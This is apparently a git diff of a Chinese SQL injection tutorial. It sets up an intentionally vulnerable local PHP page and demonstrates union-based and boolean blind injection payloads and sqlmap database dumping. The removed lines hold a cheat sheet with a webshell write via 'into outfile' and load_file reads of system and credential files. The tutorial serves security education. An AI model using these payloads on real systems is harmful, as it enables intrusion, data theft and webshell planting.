@@ -40,106 +40,9 @@ select * from user where un='admin' and pw='' or '1'='1'
 可以看到`where`子句对于任何用户都是恒成立的。那么我们就成功绕过了它的身份验证。
 
 
-## 手工注入
+## 环境搭建（补充）
 
-自己搭建环境比较麻烦，大家可以使用`http://mst.hi-ourlife.com/hackertest/`这个靶场，秘钥是`ZGhhc2poZGppYXNnaGQ=`。
-
-我们进入靶场，我们用它来演示手工注入，当然它现在只支持 MySQL 类型的手工注入：
-
-![](http://ww1.sinaimg.cn/large/841aea59jw1fav3nuo3eej20m608y0ta.jpg)
-
-首先我们使用单引号判断一下，发现它出错了：
-
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav3o1ylr3j20p609d0tl.jpg)
-
-然后是`and 1=1`：
-
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav3o5oqt4j20d00893yv.jpg)
-
-然后是`and 1=2`：
-
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav3o9on4nj20ds08pt94.jpg)
-
-下一步就是要看它的字段长度，使用`order by`。我们先输入一个大一些的数，比如`10`：
-
-![]()
-
-返回假，然后尝试`5`，返回真，说明字段数量为 5：
-
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav3oe9yhhj20ig08ewf0.jpg)
-
-之后我们需要匹配它的字段，直接用`union`爆破字段。
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3ottg6fj20h108b3z1.jpg)
-
-查询结果是`2`，说明第二个字段最终显示，那么我们可以替换`union`中的`2`，比如我们查询一下`version()`。
-
-![](http://ww1.sinaimg.cn/large/841aea59jw1fav3p0a80nj20hn086dge.jpg)
-
-## 手工注入（2）
-
-这次是实战靶场。首先访问如图的 URL，猜测`id`参数可能是注入点：
-
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav3p4exrzj213v0nf763.jpg)
-
-首先按照前面的方式判断是否存在注入：
-
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav3p6vjdmj213l0nfjt2.jpg)
-
-可以看到`and 1=1`返回正常，`and 1=2`返回异常，表明存在注入。（正常异常的标准是，和不加`and`一样就算正常）
-
-之后使用`order by`探测字段数量，尝试到`2`时，发现返回正常。
-
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav3pw30bkj213i0nrq4t.jpg)
-
-联合查询之后，发现页面中显示`1`：
-
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav3q44w4kj213i0ncabs.jpg)
-
-使用`version()`替换联合查询中的`1`，得到版本：
-
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav3q71o2gj213a0nejt2.jpg)
-
-同理我们可以查看`database()`和`user()`。
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3qao8jnj213o0nf0ul.jpg)
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3ql0pr2j213e0ntgng.jpg)
-
-## SqlMap 的使用
-
-键入如下命令并执行：
-
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav3qq765vj20ig0bzjrk.jpg)
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3qsuiz2j20ig0bvwfi.jpg)
-
-![](http://ww1.sinaimg.cn/large/841aea59jw1fav3qw2dggj20if0bw0u9.jpg)
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3qyii0jj20ih0bu76d.jpg)
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3r3l3jhj20ih0bymyt.jpg)
-
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav3r7ixwzj20ih0bvt9y.jpg)
-
-
-可以从中看到所有的载荷（payload）。并且我们之前判断的没有错，就是`kg`。
-
-之后我们再获取`kg`中的表：
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3raav6kj20ig0bvt9v.jpg)
-
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav3s3jrjhj20ij0btgnm.jpg)
-
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav3sb90eaj20ih0bwdhw.jpg)
-
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav3sf2ae6j20ij0bwq4n.jpg)
-
-结果是没有找到任何表。
-
-## 环境搭建
-
-（这节内容课件里面没有，是我自己补充的。）
+视频中的程序我找不到，所以还是自己搭个靶场演示吧，但是步骤是一样的。关于数据库环境我想说一下，不同数据库使用不同的配置和 SQL 方言，一个数据库上有用的方法不一定能用在另一个数据库上。但是，目前 70% 的网站都使用 MySQL，所以这篇讲义只会涉及 MySQL。
 
 大家可以下载 DVWA 在本地建立实验环境，如果觉得麻烦，可以自己写个脚本来建立。这里教给大家如何在本地建立实验环境。
 
@@ -151,7 +54,7 @@ create table if not exists sqlinj (
     id int primary key auto_increment,
     info varchar(32)
 );
-insert into sqlinj values (1, "item: 1");
+insert into sqlinj values (1, "item #1");
 ```
 
 这里我们创建了`sqlinj`表，并插入了一条数据。其实插入一条数据就够了，足以查看显示效果。
@@ -159,7 +62,7 @@ insert into sqlinj values (1, "item: 1");
 之后我们将以下内容保存为`sql.php`：
 
 ```php
-<form method="POST" action="./sql.php">
+<form method="GET" action="">
     ID：
     <input type="text" name="id" />
     <input type="submit" value="查询" />
@@ -172,7 +75,7 @@ $un = '';
 $pw = '';
 $db = '';
 
-$id = @$_POST['id'];
+$id = @$_GET['id'];
 if($id == '')
     return;
 $conn = @mysql_connect($host . ':' . $port, $un, $pw);
@@ -198,185 +101,496 @@ else
 mysql_close($conn);
 ```
 
-在文件目录下执行`php -S 0.0.0.0:80`，然后访问`http://localhost/sql.php`，然后就可以进行各种操作了：
+在文件目录下执行`php -S 0.0.0.0:80`，然后访问`http://localhost/sql.php`，然后就可以进行各种操作了。
 
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav5xpjnpsj20ga03w3yi.jpg)
+## 手工注入：基于回显
 
-![](http://ww1.sinaimg.cn/large/841aea59jw1fav5xy1misj20fh05k3yk.jpg)
+基于回显的意思就是页面中存在显示数据库中信息的地方，通过注入我们就能把我们要查询的东西显示在页面上。一般页面中显示相关信息（比如帖子标题、内容）就能认为是基于回显的。
 
-![](http://ww1.sinaimg.cn/large/841aea59jw1fav5y7pnfhj20ic06aglp.jpg)
+### 判断注入点
 
-![](http://ww2.sinaimg.cn/large/841aea59jw1fav5ydedvrj20fn06edfw.jpg)
+我们将`id`设为`1 and 1=1`，发现正常显示。
 
-![](http://ww4.sinaimg.cn/large/841aea59jw1fav5yis68oj20fj06at8s.jpg)
+![](http://upload-images.jianshu.io/upload_images/118142-9b87a22b311bf64f.jpg)
 
-![](http://ww3.sinaimg.cn/large/841aea59jw1fav5ymvj0zj20fp06bmxa.jpg)
+将`id`设为`1 and 1=2`，显示“无此记录”。
 
-## 附录
+![](http://upload-images.jianshu.io/upload_images/118142-71ee355e766608cf.jpg)
 
-判断是否存在SQL注入
+那么这里就很可能出现注入点。
 
-```
-'
-and 1=1
-and 1=2
-```
+### 判断列数量
 
-暴字段长度
+我们下一步需要判断查询结果的列数量，以便之后使用`union`语句。我们构造：
 
 ```
-Order by 数字
+id=1 order by ?
 ```
 
-匹配字段
+其中问号处替换为从 1 开始的数字，一个一个尝试它们。直到某个数字 N 报错，那么列数为 N - 1。
+
+例如我这里，先尝试 1，没有报错：
+
+![](http://upload-images.jianshu.io/upload_images/118142-697fddbefbf07505.jpg)
+
+尝试 2 也没有报错，然后尝试 3 的时候：
+
+![](http://upload-images.jianshu.io/upload_images/118142-28ff98db00e79068.jpg)
+
+出现了错误，说明列数是 2。
+
+### 确定显示的列
+
+我们可以构造语句了：
 
 ```
-and 1=1 union select 1,2,..,n
+1 and 1=2 union select 1,2
 ```
 
-暴字段位置
+![](http://upload-images.jianshu.io/upload_images/118142-d045e2d8892d7ea8.jpg)
+
+显示位置为 2 号位，而且只有一个显示位置。
+
+### 查询用户及数据库名称
+
+在 MySQL 中，`current_user`函数显示用户名称，`database`函数显示当前数据库名称。这里只有一个显示位置，为了方便起见，我们可以使用`concat`函数一次性显示出来。
 
 ```
-and 1=2 union select 1,2,..,n
-```
- 
-利用内置函数暴数据库信息
-
-```
-version() database() user()
+1 and 1=2 union select 1,concat(current_user(),' ',database())
 ```
 
-不用猜解可用字段暴数据库信息(有些网站不适用):
+![](http://upload-images.jianshu.io/upload_images/118142-502df2943e0689c0.jpg)
+
+可以看到这里的用户名称是`root`，数据库名称是`test`。如果在真实场景下遇到，基本就可以断定是 root 权限了。
+
+### 查询表的数量
+
+MySQL 中有一个数据库叫做`information_schema`，储存数据库和表的元信息。`information_schema`中有两个重要的表，一个叫`tables`，储存表的元信息，有两列特别重要，`table_schema`是所属数据库，`table_name`是表名称。另一个表示`columns`，储存列的源信息，`table_name`列是所属表名称，`column_name`列是列名称。
 
 ```
-and 1=2 union all select version() 
-and 1=2 union all select database() 
-and 1=2 union all select user() 
+1 and 1=2 union select 1,count(table_name) from information_schema.tables where table_schema=database()
 ```
 
-操作系统信息：
+![](http://upload-images.jianshu.io/upload_images/118142-0f19703943b0d628.jpg)
+
+这里我们使用`count`函数查询出了表的数量，一共七个。这里我们只查询当前数据库，如果要查询全部，可以把`where`子句给去掉。
+
+### 查询表名
+
+因为它只能显示一条记录，我们使用`limit`子句来定位显示哪一条。`limit`子句格式为`limit m,n`，其中`m`是从零开始的起始位置，`n`是记录数。我们构造：
 
 ```
-and 1=2 union all select @@global.version_compile_os from mysql.user 
+1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit ?,1
 ```
 
-数据库权限：
+我们需要把问号处换成 0 ~ 6，一个一个尝试，七个表名称就出来了。比如，我们获取第一个表的名称。
+
+!()[http://upload-images.jianshu.io/upload_images/118142-a2baf5dcdbb4c43a.jpg]
+
+它叫`email`，在真实场景下，这里面一般就是一部分用户信息了。如果第一个表示无关紧要的信息，可以继续寻找。
+
+### 查询列数量
+
+与表数量的查询类似，我们需要把所有`table`换成`column`。我们构造：
 
 ```
-and ord(mid(user(),1,1))=114  返回正常说明为root
+1 and 1=2 union select 1,count(column_name) from information_schema.columns where table_name='email'
 ```
 
-暴库 (mysql>5.0)
+![](http://upload-images.jianshu.io/upload_images/118142-9535183e8fbfc067.jpg)
 
-Mysql 5 以上有内置库 `information_schema`，存储着mysql的所有数据库和表结构信息
+一共有两个。
 
-```
-and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
-```
+### 查询列名
 
-猜表
+我们把`count`去掉，加上`limit`，就出来了：
 
 ```
-and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—
+1 and 1=2 union select 1,column_name from information_schema.columns where table_name='email' limit ?,1
 ```
 
-猜字段
+同样，我们需要把问号替换为 0 和 1；
+
+!()[http://upload-images.jianshu.io/upload_images/118142-fc29392755f102e5.jpg]
+
+我们这里查询结果为，第一列叫做`userid`，第二列叫做`email`。
+
+### 查询行数量
 
 ```
-and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1
+1 and 1=2 union select 1, count(1) from email
 ```
 
-暴密码
+!()[http://upload-images.jianshu.io/upload_images/118142-ad87dad537ba05d2.jpg]
+
+### 查询记录
 
 ```
-and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1
+1 and 1=2 union select 1,concat(userid,' ',email) from email limit ?,1
 ```
 
-高级用法（一个可用字段显示两个数据内容）：
+我们把问号替换为 0 和 1，就得到了所有的数据。
 
-```
-Union select 1,2,3,concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1
-```
+!()[http://upload-images.jianshu.io/upload_images/118142-af910d42d4e22a9d.jpg]
 
-直接写马(Root权限)
+## 手工注入：基于布尔值
 
-条件：
+在一些情况下，页面上是没有回显的。也就是说，不显示任何数据库中的信息。我们只能根据输出判断是否成功、失败、或者错误。这种情况就叫做盲注。
 
-1、知道站点物理路径
+比如说，我们把上面的代码改一下，倒数第三行改为：
 
-2、有足够大的权限（可以用s`elect …. from mysql.user`测试）
-
-3、`magic_quotes_gpc()=OFF`
-
-```
-select ‘<?php eval_r($_POST[cmd])?>' into outfile ‘物理路径'
-and 1=2 union all select 一句话HEX值 into outfile '路径'
+```php
+echo "<p>存在此记录</p>";
 ```
 
-`load_file()` 常用路径：
+这样我们就不能通过`union`把它显示到页面上。所以我们需要一些盲注技巧。这种技巧之一就是基于布尔值，具体来说就是，如果我们想查询整数值，构造布尔语句直接爆破；如果想查询字符串值，先爆破它的长度，再爆破每一位。
 
-1.  `replace(load_file(0×2F6574632F706173737764),0×3c,0×20)`
-1.  `replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))`
-上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 `<` 替换成”空格” 返回的是网页.而无法查看到代码.
-1.  `load_file(char(47))` 可以列出FreeBSD,Sunos系统根目录
-1.  `/etc tpd/conf tpd.conf`或`/usr/local/apche/conf tpd.conf` 查看linux APACHE虚拟主机配置文件
-1.  `c:\Program Files\Apache Group\Apache\conf \httpd.conf` 或`C:\apache\conf \httpd.conf `查看WINDOWS系统apache文件
-1.  `c:/Resin-3.0.14/conf/resin.conf` 查看jsp开发的网站 resin文件配置信息.
-1.  `c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf` 查看linux系统配置的JSP虚拟主机
-1.  `d:\APACHE\Apache2\conf\httpd.conf`
-1.  `C:\Program Files\mysql\my.ini`
-1.  `../themes/darkblue_orange/layout.inc.php phpmyadmin` 爆路径
-1.  `c:\windows\system32\inetsrv\MetaBase.xml` 查看IIS的虚拟主机配置文件
-1.  `/usr/local/resin-3.0.22/conf/resin.conf` 针对3.0.22的RESIN配置文件查看
-1.  `/usr/local/resin-pro-3.0.22/conf/resin.conf` 同上
-1.  `/usr/local/app/apache2/conf/extra tpd-vhosts.conf` APASHE虚拟主机查看
-1.  `/etc/sysconfig/iptables` 本机防火墙策略
-1.  `usr/local/app/php5 b/php.ini` PHP 的相当设置
-1.  `/etc/my.cnf` MYSQL的配置文件
-1.  `/etc/redhat-release` 红帽子的系统版本
-1.  `C:\mysql\data\mysql\user.MYD` 存在MYSQL系统中的用户密码
-1.  `/etc/sysconfig/network-scripts/ifcfg-eth0` 查看IP.
-1.  `/usr/local/app/php5 b/php.ini` //PHP相关设置
-1.  `/usr/local/app/apache2/conf/extra tpd-vhosts.conf` //虚拟网站设置
-1.  `C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini`
-1.  `c:\windows\my.ini`
-1.  `c:\boot.ini`
+### 查询用户及数据库名称
 
-网站常用配置文件 
+基于布尔的注入中，判断注入点的原理是一样的。确定注入点之后我们直接查询用户及数据库名称（当然也可以跳过）。由于这种情况下所有查询都特别复杂，所以我们只选取其中一个，比如数据名称。
+
+首先爆破数据库名称的长度，我们构造：
 
 ```
-config.inc.php、config.php。
+1 and (select length(database()))=?
 ```
 
-`load_file()`时要用`replace(load_file(HEX)，char(60),char(32))`
+问号处需要替换为数字，从 1 开始，直至出现正确的信息。为了简化操作，这里我们可以使用 Burp 了。
 
-注：
+![](http://upload-images.jianshu.io/upload_images/118142-1400808c47d2dc7b.jpg)
 
-```
-Char(60)表示 <
-Char（32）表示 空格
-```
-
-手工注射时出现的问题：
-
-当注射后页面显示：
+它的长度为 4，这里我们再构造：
 
 ```
-Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'
+1 and (select substr(database(),$1,1))=$2
 ```
 
-如：
+我们需要把`$1`替换成 1 ~ 4 的整数（`substr`从 1 开始），把`$2`替换成 a ~ z 、 0 ~ 9 以及`_`的 ASCLL 十六进制（SQL 不区分大小写）。这里我们最好把这些十六进制值存成一个列表，便于之后使用。
+
+之后开始爆破（类型选择`cluster bomb`，第一个 payload 选择`number`，第二个 payload 选择`preset lists`）：
+
+![](http://upload-images.jianshu.io/upload_images/118142-75b383b51f0df59f.jpg)
+
+我们通过查表得知，结果为`test`。
+
+## 查询表的数量
 
 ```
-/instrument.php?ID=13 and 1=2 union select 1,load_file(0x433A5C626F6F742E696E69),3,4,user()
+1 and (select count(table_name) from information_schema.tables where table_schema=database())=?
 ```
 
-这是由于前后编码不一致造成的，
+问号处替换为从一开始的数字。我们可以看到，数量为 7。
 
-解决方法：在参数前加上 `unhex(hex(参数))`就可以了。上面的URL就可以改为：
+![](http://upload-images.jianshu.io/upload_images/118142-eaf16f9dc4f7a32a.jpg)
+
+## 查询表名
+
+我们这里演示如何查询第一个表的表名。
+
+首先查询表名长度。
 
 ```
-/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))
+1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=?
+```
+
+问号处换成从 1 开始的整数。长度为 5：
+
+![](http://upload-images.jianshu.io/upload_images/118142-6bc29940612a9a8e.jpg)
+
+之后，再爆破每个字符。
+
+```
+1 and (select substr(table_name,$1,1) from information_schema.tables where table_schema=database() limit 0,1)=$2
+```
+
+`$1`配置为 1 ~ 5的整数，`$2`的配置为上面的列表。
+
+![](http://upload-images.jianshu.io/upload_images/118142-edd202af6a30957b.jpg)
+
+查表可得，结果为`email`。
+
+## 查询列数量
+
+我们下面演示查询`email`表的列数。
+
+```
+1 and (select count(column_name) from information_schema.columns where table_name='email')=?
+```
+
+问号处替换为从一开始的数字。我们可以看到，数量 2。
+
+![](http://upload-images.jianshu.io/upload_images/118142-835d83b4df9b7e5d.jpg)
+
+## 查询列名称
+
+作为演示，我这里查询第二列（`limit 1,1`）的名称。
+
+首先需要查询其长度：
+
+```
+1 and (select length(column_name) from information_schema.columns where table_name='email' limit 1,1)=?
+```
+
+问号处换成从 1 开始的整数。长度为 5：
+
+![](http://upload-images.jianshu.io/upload_images/118142-83611bd7189b880a.jpg)
+
+之后爆破每个字符：
+
+```
+1 and (select substr(column_name,$1,1) from information_schema.columns where table_name='email' limit 1,1)=$2
+```
+
+`$1`配置为 1 ~ 5的整数，`$2`的配置为上面的列表。
+
+![](http://upload-images.jianshu.io/upload_images/118142-b0cdf2a93255aa5e.jpg)
+
+结果是`email`。
+
+## 查询行数量
+
+```
+1 and (select count(1) from email)=?
+```
+
+问号处替换为从一开始的数字。我们可以看到，数量为 2。
+
+![](http://upload-images.jianshu.io/upload_images/118142-5af57e4f3fdad21d.jpg)
+
+## 查询记录
+
+我们这里演示如何查询第一条记录的`email`列。
+
+首先是长度：
+
+```
+1 and (select length(email) from email limit 0,1)=?
+```
+
+问号处替换为从一开始的数字。我们可以看到，长度为 17。
+
+![](http://upload-images.jianshu.io/upload_images/118142-e48ff0d2979531e3.jpg)
+
+之后爆破每个字符：
+
+```
+1 and (select substr(email,$1,1) from email limit 0,1)=$2
+```
+
+`$1`配置为 1 ~ 17的整数，`$2`的配置为所有可见字符的十六进制 ascll 值（0x20 ~ 0x7e）。
+
+这个时间有些长，就不演示了。
+
+## SqlMap
+
+### 下载
+
+安装 Python 之后，执行
+
+```
+pip install sqlmap
+```
+
+然后
+
+```
+C:\Users\asus> sqlmap
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.1#pip}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+Usage: sqlmap [options]
+
+sqlmap: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, -x, --wizard, --update, --purge-output or --dependencies), use -h for basic or -hh for advanced help
+
+
+Press Enter to continue...
+```
+
+### 判断注入点
+
+直接使用`-u`命令把 URL 给 SqlMap 会判断注入点。
+
+```
+sqlmap -u http://localhost/sql.php?id=
+```
+
+要注意这样 sqlmap 会判断所有的动态参数，要指定某个参数，使用`-p`：
+
+```
+sqlmap -u http://localhost/sql.php?id= -p id
+```
+
+结果：
+
+```
+[*] starting at 12:05:40
+
+[12:05:40] [WARNING] provided value for parameter 'id' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[12:05:40] [INFO] testing connection to the target URL
+[12:05:41] [INFO] heuristics detected web page charset 'utf-8'
+[12:05:41] [INFO] testing if the target URL is stable
+[12:05:42] [INFO] target URL is stable
+[12:05:44] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[12:05:46] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+```
+
+sqlmap 报告了参数`id`可能存在注入。
+
+如果参数在 HTTP 正文或者 Cookie 中，可以使用`--data <data>`以及`--cookie <cookie>`来提交数据。
+
+### 获取数据库及用户名称
+
+`--dbs`用于获取所有数据库名称，`--current-db`用于获取当前数据库，`--current-user`获取当前用户。
+
+```
+C:\Users\asus> sqlmap -u http://localhost/sql.php?id= -p id --current-db
+
+...
+
+[12:10:44] [INFO] fetching current database
+[12:10:54] [INFO] retrieved: test
+current database:    'test'
+[12:10:54] [INFO] fetched data logged to text files under 'C:\Users\asus\.sqlmap\output\localhost'
+
+[*] shutting down at 12:10:54
+```
+
+### 获取表名
+
+`-D`用于指定数据库名称，如果未指定则获取所有数据库下的表名。`--tables`用于获取表名。
+
+```
+C:\Users\asus> sqlmap -u http://localhost/sql.php?id= -p id -D test --tables
+
+...
+
+[12:13:25] [INFO] fetching tables for database: 'test'
+[12:13:28] [INFO] the SQL query used returns 7 entries
+[12:13:30] [INFO] retrieved: email
+[12:13:32] [INFO] retrieved: history
+[12:13:34] [INFO] retrieved: iris
+[12:13:36] [INFO] retrieved: message
+[12:13:38] [INFO] retrieved: result
+[12:13:40] [INFO] retrieved: sqlinj
+[12:13:42] [INFO] retrieved: test_table
+Database: test
+[7 tables]
++------------+
+| email      |
+| history    |
+| data       |
+| message    |
+| result     |
+| sqlinj     |
+| test_table |
++------------+
+
+[12:13:42] [INFO] fetched data logged to text files under 'C:\Users\asus\.sqlmap\output\localhost'
+
+[*] shutting down at 12:13:42
+```
+
+### 获取列名
+
+`-T`用于指定表名，`--columns`用于获取列名。
+
+```
+C:\Users\asus> sqlmap -u http://localhost/sql.php?id= -p id -D test -T email --columns
+
+...
+
+[12:15:02] [INFO] fetching columns for table 'email' in database 'test'
+[12:15:04] [INFO] the SQL query used returns 2 entries
+[12:15:06] [INFO] retrieved: userid
+[12:15:08] [INFO] retrieved: varchar(16)
+[12:15:11] [INFO] retrieved: email
+[12:15:14] [INFO] retrieved: varchar(32)
+Database: test
+Table: email
+[2 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| email  | varchar(32) |
+| userid | varchar(16) |
++--------+-------------+
+
+[12:15:30] [INFO] fetched data logged to text files under 'C:\Users\asus\.sqlmap\output\localhost'
+
+[*] shutting down at 12:15:30
+```
+
+### 获取记录
+
+`--dump`用于获取记录，使用`-C`指定列名的话是获取某一列的记录，不指定就是获取整个表。
+
+```
+C:\Users\asus> sqlmap -u http://localhost/sql.php?id= -p id -D test -T email --dump
+
+...
+
+[12:16:59] [INFO] fetching columns for table 'email' in database 'test'
+[12:16:59] [INFO] the SQL query used returns 2 entries
+[12:16:59] [INFO] resumed: userid
+[12:16:59] [INFO] resumed: varchar(16)
+[12:16:59] [INFO] resumed: email
+[12:16:59] [INFO] resumed: varchar(32)
+[12:16:59] [INFO] fetching entries for table 'email' in database 'test'
+[12:17:01] [INFO] the SQL query used returns 2 entries
+[12:17:04] [INFO] retrieved: test2@example.com
+[12:17:06] [INFO] retrieved: 123
+[12:17:08] [INFO] retrieved: wizard.z@qq.com
+[12:17:10] [INFO] retrieved: 233837063867287
+[12:17:10] [INFO] analyzing table dump for possible password hashes
+Database: test
+Table: email
+[2 entries]
++-----------------+-------------------+
+| userid          | email             |
++-----------------+-------------------+
+| 123             | test2@example.com |
+| 233837063867287 | test@example.com  |
++-----------------+-------------------+
+
+[12:17:10] [INFO] table 'test.email' dumped to CSV file 'C:\Users\asus\.sqlmap\output\localhost\dump\test\email.csv'
+[12:17:10] [INFO] fetched data logged to text files under 'C:\Users\asus\.sqlmap\output\localhost'
+
+[*] shutting down at 12:17:10
+```
+
+## 文本型注入点
+
+上面我们一直在讲解数值型注入点，如果我们把 SQL 语句
+
+```php
+$sql = "select id, info from sqlinj where id=$id";
+```
+
+改为
+
+```php
+$sql = "select id, info from sqlinj where id='$id'";
+```
+
+那么在测试的时候就会出现`1=1`和`1=2`都存在的情况。
+
+
+![1.jpg](http://upload-images.jianshu.io/upload_images/118142-2d93d78398143cb8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+
+![2.jpg](http://upload-images.jianshu.io/upload_images/118142-61e0adaa697b1413.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+
+这时我们就不知道它是过滤了还是真的有注入点。所以我们可以修改参数，用一个单引号闭合前面的引号，再用一个注释符号（`#`或者`-- `）来注释掉后面的引号：
+
+```
+1' and 1=1 #
+1' and 1=2 #
+1' order by ? #
+...
 ```
 
 ## 附录
@@ -387,6 +601,12 @@ Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPL
 
 + [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](http://www.freebuf.com/articles/web/120985.html)
 
-+ [SqlMap用户手册](http://www.91ri.org/6775.html)
++ [SqlMap用户手册](http://blog.csdn.net/wizardforcel/article/details/50695931)
 
-+ [sqlmap用户手册(续)](http://www.91ri.org/6842.html)
++ [sqlmap用户手册(续)](http://blog.csdn.net/mydriverc2/article/details/41390319)
+
++ [MySQL 手工注入常用语句](http://blog.csdn.net/wizardforcel/article/details/59480461)
+
++ [Kali Linux Web 渗透测试秘籍 第六章 利用 -- 低悬的果实](http://www.jianshu.com/p/bd3daa312fe5)
+
++ [Kali Linux Web 渗透测试秘籍 第七章 高级利用](http://www.jianshu.com/p/f671bc45b7f1)
